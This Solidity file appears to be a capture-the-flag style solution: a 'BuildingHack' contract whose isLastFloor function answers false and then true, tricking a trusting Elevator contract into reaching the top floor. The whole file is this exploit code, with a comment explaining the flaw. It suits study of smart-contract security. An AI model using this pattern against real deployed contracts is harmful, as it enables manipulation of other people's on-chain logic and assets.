//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Provided that the function isLastFloor is not a getter, then it can modify the Building state.
// Therefore, it can alter the state on the Elevator query's response.

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract BuildingHack is Building {

    IElevator elevator;
    bool lastFloor;

    constructor(IElevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint) external returns (bool) {
        bool prevState = lastFloor;
        if(!prevState) {
            lastFloor = true;
        }

        return prevState;
    }

    function goToTop(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}